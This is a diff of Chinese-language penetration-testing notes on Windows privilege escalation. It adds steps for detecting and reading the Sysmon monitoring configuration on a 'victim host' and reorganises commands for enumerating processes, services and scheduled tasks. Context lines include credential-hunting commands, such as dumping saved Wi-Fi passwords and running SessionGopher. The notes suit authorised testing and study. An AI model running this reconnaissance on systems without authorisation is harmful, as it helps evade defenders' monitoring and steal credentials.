@@ -9,8 +9,71 @@
 
 ### Checklists - Windows提权之前必要信息搜集
 
+#### 检测Sysmon
 
-Windows 版本和配置
+拿到Windows主机首先判断是否有Sysmon  检测方法参考 [Red Teaming Experiments](https://ired.team/offensive-security/enumeration-and-discovery/detecting-sysmon-on-the-victim-host)
+
+
+
+* 如何判断当前Windows主机是否有Sysmon
+  * 1 “进程名” - 可被修改 如果不存在名为"Sysmon"的进程，不表示Sysmon必定不存在。
+  * 2 “服务名称与描述” 可被修改 如果不存在相关服务，不表示Sysmon必定不存在。
+  * 3 Windows事件(Windows Events) 
+  * 4 运行fltMC.exe(win7下测试发现 需要管理员权限启动)
+  * 5 Sysmon Tools + Accepted Eula
+  * 6 如果确认存在，检查Sysmon的配置信息
+  * 7 直接搜索磁盘 查找Sysmon的配置文件
+  * 8 从注册表中提取Sysmon的规则 powershell命令
+
+```
+# 1 “进程名” 
+
+tasklist /v
+
+# 第三方脚本
+# 进程枚举 - 根据名称查找  如查找名为"Sysmon"的进程进程信息 注意Sysmon安装时可自定义进程名称
+Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
+
+
+# 2 “服务名称与描述”
+
+# 服务枚举 - 根据描述查找
+Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+
+# 服务枚举 - 根据名称查找
+Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+
+
+# 3 Windows事件(Windows Events) 
+# 通过 Windows事件(Windows Events) 检测Sysmon  如果输出有内容则确认存在  输出没有内容通常是不存在 需结合其他情况综合判断
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
+
+# 4 运行fltMC.exe(win7下测试发现 需要管理员权限启动)
+# 即使您可以更改sysmon服务和驱动程序名称，"sysmon altitude"始终相同为固定值 385201
+fltMC.exe
+
+
+# 5 Sysmon Tools + Accepted Eula
+# powershell下执行
+ls HKCU:\Software\Sysinternals
+# 如果System Moniter 为1 则存在
+
+# 6 如果确认存在，检查Sysmon的配置信息
+sysmon -c
+
+# 7 直接搜索磁盘 查找Sysmon的配置文件
+findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
+
+# 8 从注册表中提取Sysmon的规则 powershell命令
+(Get-SysmonConfiguration).Rules
+
+# 如查看ProcessCreate规则
+(Get-SysmonConfiguration).Rules[0].Rules
+
+```
+
+
+#### Windows 版本和配置
 ```
 Windows Version and Configuration
 # ---------------
@@ -52,7 +115,8 @@ wmic logicaldisk get caption || fsutil fsinfo drives
 # 命令fsutil fsinfo drives 需要管理员权限 只会获取:硬盘(本地磁盘)、移动存储设备(软盘驱动器 DVD驱动器)   不会获取:网络位置(网络驱动器)
 ```
 
-用户枚举
+#### 用户枚举
+
 ```
 User Enumeration
 # ---------------
@@ -120,8 +184,8 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
 ```
 
+#### 网络枚举
 
-网络枚举
 ```
 Network Enumeration
 # ---------------
@@ -245,6 +309,7 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 
 ```
 
+
 ### EoP - Windows各种提权方式
 
 #### EoP - 密码搜集
@@ -358,8 +423,6 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 C:\inetpub\wwwroot\web.config
 
 
-
-
 # ---------------
 # Other files
 # 其他文件
@@ -414,55 +477,80 @@ cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| fi
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
+```
 
+### EoP - Processes Enumeration and Tasks
 
-
+进程枚举 和 任务
+```
 # ---------------
-# Processes Enumeration and Tasks
-# 进程枚举和任务
+# List Processes
 
 # What processes are running?
 # 哪些进程正在运行？
 
 tasklist /v
-net start
-sc query
-Get-Service
-Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
-
-
 
 # Which processes are running as "system"
 # 哪些进程作为SYSTEM运行
 
 tasklist /v /fi "username eq system"
 
+
+# 第三方脚本
+# 进程枚举 - 根据名称查找  如查找名为"Sysmon"的进程进程信息 注意Sysmon安装时可自定义进程名称
+Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
+
+# 进程枚举 - 根据名称查找
+Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+
+
+
+# ---------------
+# List services
+# 服务枚举 - 系统命令 查看已经启动的 Windows 服务
+net start
+
+# 服务枚举 - 系统命令
+sc query
+wmic service list brief
+tasklist /SVC
+
+
+# 第三方脚本
+# 服务枚举 - 根据描述查找
+Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+
+# 服务枚举 - 根据名称查找
+Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+
+# ---------------
 # Do you have powershell magic?
+# 查看powershell版本信息
 
 REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
 
+# ---------------
 # List installed programs
 # 列出已安装的程序
 
 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 
-# List services
-# 列出服务
 
-net start
-wmic service list brief
-tasklist /SVC
-
+# ---------------
 
 # Scheduled tasks
 # 计划任务
 
 schtasks /query /fo LIST 2>nul | findstr TaskName
+
+# 第三方脚本
 Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 
+
 # Startup tasks
-# 启动任务
+# 自启动任务
 
 wmic startup get caption,command
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
@@ -470,7 +558,6 @@ reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
 dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
 dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
-
 ```
 
 #### EoP - Incorrect permissions in services
@@ -680,3 +767,6 @@ $ computer = "<hostname>"
 
 
 详细参考 [PayloadsAllTheThings/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#token-impersonation-rottenpotato)
+
+
+
